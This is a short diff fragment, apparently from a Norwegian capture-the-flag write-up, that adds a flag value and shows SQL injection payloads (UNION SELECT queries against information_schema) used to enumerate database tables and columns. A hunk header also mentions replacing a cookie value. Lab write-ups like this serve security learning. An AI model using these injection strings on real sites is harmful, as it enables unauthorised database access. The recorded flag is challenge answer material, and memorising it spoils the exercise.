@@ -111,6 +111,7 @@ endre cookie til 000000000a7dce5ac40e7a88fd61399bbe76da161c1d65cbc2ebf2bd364545e
 ```
 
 # Flag10
+Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8 
 ```
 1 union select null, concat(table_name) from information_schema.tables where table_schema=database()
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
